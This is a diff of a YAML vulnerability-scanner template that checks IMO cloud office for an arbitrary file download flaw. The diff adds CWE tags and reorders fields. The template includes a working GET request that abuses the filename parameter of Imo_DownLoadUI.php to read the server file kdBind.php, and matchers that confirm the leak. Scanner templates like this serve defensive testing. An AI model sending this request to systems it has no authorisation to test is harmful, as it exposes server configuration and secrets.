@@ -1,5 +1,4 @@
 id: imo-file-download
-
 info:
   name: IMO - Arbitrary File Download
   author: ritikchaddha
@@ -8,33 +7,34 @@ info:
     The imo cloud office can read system sensitive files because the filename parameter of the /file/Placard/upload/Imo_DownLoadUI.php page is not strictly filtered.
   reference:
     - https://forum.butian.net/article/214
+  classification:
+    cwe-id:
+      - CWE-200
+      - CWE-552
   metadata:
     max-request: 2
-  tags: imo,file-download,vuln
-
+  tags: file-download,imo,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - <?php
+          - $bindInfo = array
+      - condition: and
+        part: header
+        type: word
+        words:
+          - application/octet-stream
+          - filename=/home/www
+      - status:
+          - 200
+        # digest: 490a004630440220041df5b5a8bb1c3155f5344da4e89a16e5946618fde4228adcc7d77aeb0a3e33022068f9fe8be41e246c823fe6196a62bed51d0dc3c8a89259e94ec4067b76a562da:922c64590222798bb761d5b6d8e72950
+
+        type: status
+    matchers-condition: and
+    raw:
       - |
         GET /file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '<?php'
-          - '$bindInfo = array'
-        condition: and
-
-      - type: word
-        part: header
-        words:
-          - "application/octet-stream"
-          - "filename=/home/www"
-        condition: and
-
-      - type: status
-        status:
-          - 200
-# digest: 4b0a0048304602210087f68fd3216ad7ab99e09e8e5b0e58cc5a19b071fa9675ea02f5a5a5952e17b2022100a67a9de9d98062a7c55848befe8a1dacdd0a8df90331f1349a840560dca027e2:922c64590222798bb761d5b6d8e72950
